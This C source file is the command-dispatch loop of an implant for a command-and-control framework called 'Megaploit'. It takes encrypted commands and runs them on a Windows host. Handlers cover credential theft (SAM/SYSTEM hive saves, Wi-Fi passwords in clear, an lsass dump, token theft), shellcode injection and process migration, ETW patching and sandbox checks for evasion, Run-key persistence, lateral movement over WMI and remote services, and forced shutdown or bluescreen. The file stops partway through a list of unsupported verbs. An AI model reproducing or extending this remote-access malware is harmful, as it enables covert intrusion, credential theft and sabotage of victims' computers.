/*
 * client/shell.c  --  Shell command-loop for the Megaploit C2 protocol
 * ======================================================================
 * Receives encrypted commands from the C2, dispatches them through the
 * handler table below, and sends encrypted responses back.  Mirrors
 * megaploit/agent/handlers.py for shared verbs.
 *
 * Verb dispatch table
 * -------------------
 *  Each verb is matched with strncmp().  megaploit/core/c_probe.py scans
 *  these strncmp() calls at runtime to discover the full verb set without
 *  hardcoding any string in Python.
 *
 *  Native C handlers (Windows API â€” no child process):
 *    sysinfo           -- OS, hostname, username, arch, CWD
 *    os_info           -- extended OS info (build, install date, uptime)
 *    cd <path>         -- SetCurrentDirectoryA
 *    ls [path]         -- directory listing
 *    ps                -- running process list (PID, name, PPID, arch, user)
 *    kill <pid>        -- TerminateProcess
 *    env [filter]      -- GetEnvironmentStrings dump
 *    getclip           -- OpenClipboard / GetClipboardData
 *    setclip <text>    -- OpenClipboard / SetClipboardData
 *    idle_time         -- GetLastInputInfo
 *    lock_screen       -- LockWorkStation
 *    active_windows    -- EnumWindows
 *    msgbox <t> <m>    -- MessageBoxA (async thread)
 *    upload <name>     -- receive framed file, write to disk
 *    download <path>   -- send "FILE_OK" then the framed file bytes
 *    persist <k> <f>   -- copy EXE to %APPDATA%\<f>, set HKCU Run key
 *    self_destruct     -- remove registry key, schedule EXE deletion, exit
 *
 *  Shell-command fallbacks (cmd.exe / powershell):
 *    users / logged_in / services / scheduled_tasks / installed_software
 *    startup_items / wifi_passwords / hashdump / dns_query / netstat / arp
 *    ifconfig / routes / etw_patch / sandbox_check / cat / mkdir / rm
 *    find_files / file_hash / tail / write_file / chmod / find_writable
 *    find_suid
 *
 *  C-exclusive verbs:
 *    inject <pid> <hex>  -- shellcode injection (NT native API, W^X)
 *    migrate <pid>       -- agent migration (reflective PE load in target)
 *    forceOff()          -- NtSetSystemPowerState + NtShutdownSystem
 *    blueScreen()        -- NtRaiseHardError(STATUS_ASSERTION_FAILURE) BSOD
 *
 *  Not-supported stubs (Python-agent-only features):
 *    screenshot / screenrecord / screen_stream / webcam / record / mic_level
 *    keylog_* / browser_* / inject_shellcode / dll_inject / reverse_shell
 *    socks5 / portfwd / token_steal / uac_bypass / cred_vault / ssh_harvest
 *    sudo_* / clip_watch / screenshot_region / notify / open_url / play_sound
 *    set_wallpaper / mouse_move / type_keys / forkbomb / living_off_land
 *    zip_download / zip_upload
 *
 *  Shell fallback:
 *    <anything else>   -- _popen() fallback; covers remaining shell commands
 */

#include "shell.h"
#include "shell_internal.h"
#include "ntcalls.h"
#include "inject.h"
#include "evasion.h"

/*
 * _json_unwrap â€” strip the outer JSON string quotes that send_msg() adds.
 * "sysinfo" â†’ sysinfo   (in-place, returns new length)
 */
static DWORD _json_unwrap(char *pBuf, DWORD cbBuf)
{
    if (cbBuf < 2 || pBuf[0] != '"' || pBuf[cbBuf - 1] != '"')
        return cbBuf;
    DWORD src = 1, dst = 0, end = cbBuf - 1;
    while (src < end) {
        if (pBuf[src] == '\\' && src + 1 < end) {
            char next = pBuf[src + 1];
            if (next == '"' || next == '\\') { pBuf[dst++] = next; src += 2; continue; }
        }
        pBuf[dst++] = pBuf[src++];
    }
    pBuf[dst] = '\0';
    return dst;
}


/* â”€â”€ Public: shell_run â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void shell_run(TLS_CONTEXT *pTls)
{
    inject_init();

    BYTE  *pCmd  = NULL;
    DWORD  cbCmd = 0;

    while (1) {
        if (pCmd) { free(pCmd); pCmd = NULL; cbCmd = 0; }

        if (!tls_recv_msg(pTls, &pCmd, &cbCmd))
            break;

        /* Strip JSON string wrapper ("cmd" â†’ cmd) */
        cbCmd = _json_unwrap((char *)pCmd, cbCmd);
        const char *cmd = (const char *)pCmd;

        /* â”€â”€ exit / q â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }
        if (cbCmd == 1 && cmd[0] == 'q') {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* â”€â”€ sysinfo â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("sysinfo", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_sysinfo(pTls);
            continue;
        }

        /* â”€â”€ os_info â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("os_info", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_os_info(pTls);
            continue;
        }

        /* â”€â”€ cd <path> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 3 && strncmp("cd ", cmd, 3) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_cd(pTls, path);
            continue;
        }

        /* â”€â”€ ls [path] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if ((cbCmd == 2 && strncmp("ls", cmd, 2) == 0) ||
            (cbCmd >= 3 && strncmp("ls ", cmd, 3) == 0)) {
            char path[MAX_PATH] = {0};
            if (cbCmd > 3) strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_ls(pTls, path[0] ? path : NULL);
            continue;
        }

        /* â”€â”€ ps â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 2 && strncmp("ps", cmd, 2) == 0 &&
            (cbCmd == 2 || cmd[2] == ' ' || cmd[2] == '\r' || cmd[2] == '\n')) {
            free(pCmd); pCmd = NULL;
            _handle_ps(pTls);
            continue;
        }

        /* â”€â”€ kill <pid> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 5 && strncmp("kill ", cmd, 5) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 5, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_kill(pTls, args);
            continue;
        }

        /* â”€â”€ env [filter] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if ((cbCmd == 3 && strncmp("env", cmd, 3) == 0) ||
            (cbCmd >= 4 && strncmp("env ", cmd, 4) == 0)) {
            char filter[256] = {0};
            if (cbCmd > 4) strncpy(filter, cmd + 4, sizeof(filter) - 1);
            free(pCmd); pCmd = NULL;
            _handle_env(pTls, filter[0] ? filter : NULL);
            continue;
        }

        /* â”€â”€ getclip â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("getclip", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_getclip(pTls);
            continue;
        }

        /* â”€â”€ setclip <text> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 8 && strncmp("setclip ", cmd, 8) == 0) {
            char text[4096] = {0};
            strncpy(text, cmd + 8, sizeof(text) - 1);
            free(pCmd); pCmd = NULL;
            _handle_setclip(pTls, text);
            continue;
        }

        /* â”€â”€ idle_time â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 9 && strncmp("idle_time", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_idle_time(pTls);
            continue;
        }

        /* â”€â”€ lock_screen â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 11 && strncmp("lock_screen", cmd, 11) == 0 &&
            (cbCmd == 11 || cmd[11] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_lock_screen(pTls);
            continue;
        }

        /* â”€â”€ active_windows â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 14 && strncmp("active_windows", cmd, 14) == 0 &&
            (cbCmd == 14 || cmd[14] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_active_windows(pTls);
            continue;
        }

        /* â”€â”€ msgbox <title> <message> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("msgbox ", cmd, 7) == 0) {
            char args[512] = {0};
            strncpy(args, cmd + 7, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_msgbox(pTls, args);
            continue;
        }

        /* â”€â”€ upload <filename> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("upload ", cmd, 7) == 0) {
            char filename[MAX_PATH] = {0};
            strncpy(filename, cmd + 7, sizeof(filename) - 1);
            free(pCmd); pCmd = NULL;
            _handle_upload(pTls, filename);
            continue;
        }

        /* â”€â”€ download <path> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 9 && strncmp("download ", cmd, 9) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 9, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_download(pTls, path);
            continue;
        }

        /* â”€â”€ persist <regkey> <filename> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 8 && strncmp("persist ", cmd, 8) == 0) {
            char args[512] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_persist(pTls, args);
            continue;
        }

        /* â”€â”€ self_destruct â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 13 && strncmp("self_destruct", cmd, 13) == 0) {
            free(pCmd); pCmd = NULL;
            _handle_self_destruct(pTls);
            return;
        }

        /* â”€â”€ inject <pid> <hex> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("inject ", cmd, 7) == 0) {
            char args[65600] = {0};
            strncpy(args, cmd + 7, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            inject_shellcode(pTls, args);
            continue;
        }

        /* â”€â”€ migrate <pid> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 8 && strncmp("migrate ", cmd, 8) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            migrate_to_pid(pTls, args);
            return;
        }

        /* â”€â”€ forceOff() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 10 && strncmp("forceOff()", cmd, 10) == 0) {
            free(pCmd); pCmd = NULL;
            NTSTATUS ns1 = NtSetSystemPowerState(PowerActionShutdownOff,
                                                  PowerSystemShutdown,
                                                  SHTDN_REASON_MAJOR_HARDWARE |
                                                  SHTDN_REASON_MINOR_POWER_SUPPLY);
            NTSTATUS ns2 = NtShutdownSystem(ShutdownPowerOff);
            if (!NT_SUCCESS(ns1) && !NT_SUCCESS(ns2)) {
                char buf[80];
                _snprintf(buf, sizeof(buf) - 1,
                    "[-] forceOff: access denied (0x%08lX / 0x%08lX) â€” "
                    "need SeShutdownPrivilege",
                    (unsigned long)ns1, (unsigned long)ns2);
                _send_str(pTls, buf);
                continue;
            }
            return;
        }

        /* â”€â”€ blueScreen() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 12 && strncmp("blueScreen()", cmd, 12) == 0) {
            free(pCmd); pCmd = NULL;
            NTSTATUS ns = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL,
                                            6, &g_hardErrorResponse);
            if (!NT_SUCCESS(ns)) {
                char buf[80];
                _snprintf(buf, sizeof(buf) - 1,
                    "[-] blueScreen: NtRaiseHardError failed (0x%08lX) â€” "
                    "need SeDebugPrivilege or SYSTEM",
                    (unsigned long)ns);
                _send_str(pTls, buf);
            }
            continue;
        }

        /* â”€â”€ Shell-command fallbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        /* These verbs map 1-to-1 to Windows shell commands.           */

        /* users â†’ net user */
        if (cbCmd >= 5 && strncmp("users", cmd, 5) == 0 &&
            (cbCmd == 5 || cmd[5] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "net user");
            continue;
        }

        /* logged_in â†’ query user */
        if (cbCmd >= 9 && strncmp("logged_in", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "query user 2>&1");
            continue;
        }

        /* services [filter] â†’ sc query / tasklist /svc */
        if (cbCmd >= 8 && strncmp("services", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            char sub[MAX_PATH] = {0};
            char shellcmd[MAX_PATH + 32] = {0};
            if (cbCmd > 9) {
                strncpy(sub, cmd + 9, sizeof(sub) - 1);
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "sc query state= all | findstr /i \"%s\"", sub);
            } else {
                strncpy(shellcmd, "sc query state= all", sizeof(shellcmd) - 1);
            }
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* scheduled_tasks â†’ schtasks */
        if (cbCmd >= 15 && strncmp("scheduled_tasks", cmd, 15) == 0 &&
            (cbCmd == 15 || cmd[15] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "schtasks /query /fo LIST 2>&1");
            continue;
        }

        /* installed_software â†’ wmic or reg query */
        if (cbCmd >= 18 && strncmp("installed_software", cmd, 18) == 0 &&
            (cbCmd == 18 || cmd[18] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "wmic product get Name,Version,InstallDate /format:list 2>&1 || "
                "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
                " /s /v DisplayName 2>&1");
            continue;
        }

        /* startup_items â†’ reg query Run keys */
        if (cbCmd >= 13 && strncmp("startup_items", cmd, 13) == 0 &&
            (cbCmd == 13 || cmd[13] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1 & "
                "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1");
            continue;
        }

        /* wifi_passwords â†’ netsh wlan */
        if (cbCmd >= 14 && strncmp("wifi_passwords", cmd, 14) == 0 &&
            (cbCmd == 14 || cmd[14] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "for /f \"tokens=2 delims=:\" %a in "
                "('netsh wlan show profiles ^| findstr Profile') do "
                "netsh wlan show profile name=%a key=clear 2>&1");
            continue;
        }

        /* hashdump â†’ reg save SAM/SYSTEM to temp files */
        if (cbCmd >= 8 && strncmp("hashdump", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "reg save HKLM\\SAM %TEMP%\\sam.hiv /y 2>&1 & "
                "reg save HKLM\\SYSTEM %TEMP%\\sys.hiv /y 2>&1 & "
                "echo [*] SAM+SYSTEM saved to %TEMP% â€” pull with download");
            continue;
        }

        /* netstat â†’ netstat -ano */
        if (cbCmd >= 7 && strncmp("netstat", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "netstat -ano 2>&1");
            continue;
        }

        /* arp â†’ arp -a */
        if (cbCmd >= 3 && strncmp("arp", cmd, 3) == 0 &&
            (cbCmd == 3 || cmd[3] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "arp -a 2>&1");
            continue;
        }

        /* ifconfig â†’ ipconfig /all */
        if (cbCmd >= 8 && strncmp("ifconfig", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "ipconfig /all 2>&1");
            continue;
        }

        /* routes â†’ route print */
        if (cbCmd >= 6 && strncmp("routes", cmd, 6) == 0 &&
            (cbCmd == 6 || cmd[6] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "route print 2>&1");
            continue;
        }

        /* dns_query <host> â†’ nslookup */
        if (cbCmd >= 10 && strncmp("dns_query ", cmd, 10) == 0) {
            char host[256] = {0};
            strncpy(host, cmd + 10, sizeof(host) - 1);
            char shellcmd[300] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1, "nslookup %s 2>&1", host);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* etw_patch â€” patch EtwEventWrite in this process */
        if (cbCmd >= 9 && strncmp("etw_patch", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            etw_patch();
            _send_str(pTls, "[+] etw_patch: EtwEventWrite patched (RET stub)");
            continue;
        }

        /* dump_lsass â€” MiniDumpWriteDump lsass â†’ %TEMP%\lsass.dmp */
        if (cbCmd >= 10 && strncmp("dump_lsass", cmd, 10) == 0 &&
            (cbCmd == 10 || cmd[10] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_dump_lsass(pTls);
            continue;
        }

        /* token_impersonate <pid> â€” steal token from <pid> */
        if (cbCmd >= 19 && strncmp("token_impersonate ", cmd, 18) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 18, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_token_impersonate(pTls, args);
            continue;
        }

        /* lateral_wmi <host> <command> â€” WMI Win32_Process.Create */
        if (cbCmd >= 12 && strncmp("lateral_wmi ", cmd, 12) == 0) {
            char args[1024] = {0};
            strncpy(args, cmd + 12, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_lateral_wmi(pTls, args);
            continue;
        }

        /* lateral_sc <host> <command> â€” remote service creation */
        if (cbCmd >= 11 && strncmp("lateral_sc ", cmd, 11) == 0) {
            char args[1024] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_lateral_sc(pTls, args);
            continue;
        }

        /* sandbox_check â†’ collect indicators via shell */
        if (cbCmd >= 13 && strncmp("sandbox_check", cmd, 13) == 0 &&
            (cbCmd == 13 || cmd[13] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "echo [CPU] & wmic cpu get NumberOfCores /value 2>&1 & "
                "echo [DISK] & wmic logicaldisk get Size /value 2>&1 & "
                "echo [UPTIME] & net stats workstation 2>&1 | findstr Statistics & "
                "echo [HOSTNAME] & hostname & "
                "echo [DEBUGGER] & wmic process where name=\"dr.watson.exe\" get name 2>&1");
            continue;
        }

        /* cat <file> â†’ type */
        if (cbCmd >= 4 && strncmp("cat ", cmd, 4) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 4, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 8] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1, "type \"%s\" 2>&1", path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* mkdir <path> â†’ mkdir */
        if (cbCmd >= 6 && strncmp("mkdir ", cmd, 6) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 6, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 10] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1, "mkdir \"%s\" 2>&1", path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* rm <path> â†’ del /f /q or rmdir /s /q */
        if (cbCmd >= 3 && strncmp("rm ", cmd, 3) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 3, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 48] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "if exist \"%s\\\" (rmdir /s /q \"%s\" 2>&1) "
                "else (del /f /q \"%s\" 2>&1)",
                path, path, path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* find_files <path> <pattern> â†’ dir /s /b */
        if (cbCmd >= 11 && strncmp("find_files ", cmd, 11) == 0) {
            char fpath[MAX_PATH] = {0};
            char fpat[128]       = {0};
            sscanf(cmd + 11, "%259s %127s", fpath, fpat);
            char shellcmd[MAX_PATH + 160] = {0};
            if (fpat[0])
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "dir /s /b \"%s\\%s\" 2>&1", fpath, fpat);
            else
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "dir /s /b \"%s\" 2>&1", fpath);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* file_hash <path> â†’ certutil -hashfile SHA256 */
        if (cbCmd >= 10 && strncmp("file_hash ", cmd, 10) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 10, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 32] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "certutil -hashfile \"%s\" SHA256 2>&1", path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* tail <file> [n] â†’ powershell Get-Content -Tail */
        if (cbCmd >= 5 && strncmp("tail ", cmd, 5) == 0) {
            char path[MAX_PATH] = {0};
            int  n = 20;
            sscanf(cmd + 5, "%259s %d", path, &n);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "powershell -NoProfile -Command \"Get-Content '%s' -Tail %d\" 2>&1",
                path, n);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* write_file <path> <content> â†’ echo > file */
        if (cbCmd >= 11 && strncmp("write_file ", cmd, 11) == 0) {
            char path[MAX_PATH] = {0};
            const char *rest = cmd + 11;
            /* first token is path, remainder is content */
            size_t pi = 0;
            while (*rest && *rest != ' ' && pi < MAX_PATH - 1) path[pi++] = *rest++;
            if (*rest == ' ') rest++;
            char shellcmd[MAX_PATH + 4096] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "powershell -NoProfile -Command "
                "\"Set-Content -Path '%s' -Value '%s'\" 2>&1",
                path, rest);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* chmod <mode> <path> â†’ icacls (Windows approximation) */
        if (cbCmd >= 6 && strncmp("chmod ", cmd, 6) == 0) {
            char mode[16] = {0}, path[MAX_PATH] = {0};
            sscanf(cmd + 6, "%15s %259s", mode, path);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "icacls \"%s\" 2>&1 & echo [!] chmod mapped to icacls on Windows",
                path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* find_writable <path> â†’ icacls + findstr */
        if (cbCmd >= 14 && strncmp("find_writable ", cmd, 14) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 14, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "icacls \"%s\" /t 2>&1 | findstr /i \"(W) (M) (F) Everyone Users\"",
                path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* find_suid â†’ Windows has no SUID; list privileged services instead */
        if (cbCmd >= 9 && strncmp("find_suid", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "echo [*] No SUID on Windows. Listing unquoted service paths: & "
                "wmic service get name,pathname,startmode 2>&1 | "
                "findstr /i /v \"C:\\\\Windows\\\\\"");
            continue;
        }

        /* â”€â”€ Not-supported stubs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        /* Python-agent-only features: return a clear error rather than  */
        /* hanging on a recv_msg() that will never get a reply.          */

#define _NS(verb, vlen) \
        if (cbCmd >= (vlen) && strncmp((verb), cmd, (vlen)) == 0 && \
            (cbCmd == (vlen) || cmd[(vlen)] == ' ')) { \
            free(pCmd); pCmd = NULL; \
            _not_supported(pTls, (verb)); \
            continue; \
        }

        _NS("screenshot",         10)
        _NS("screenshot_region",  17)
        _NS("screenshot_timelapse", 21)
        _NS("screenrecord",       12)
        _NS("screen_stream",      13)
        _NS("webcam",              6)
        _NS("record",              6)
        _NS("mic_level",           9)
        _NS("keylog_start",       12)
        _NS("keylog_dump",        11)
        _NS("keylog_stop",        11)
        _NS("browser_history",    15)
        _NS("browser_creds",      13)
        _NS("inject_shellcode",   16)
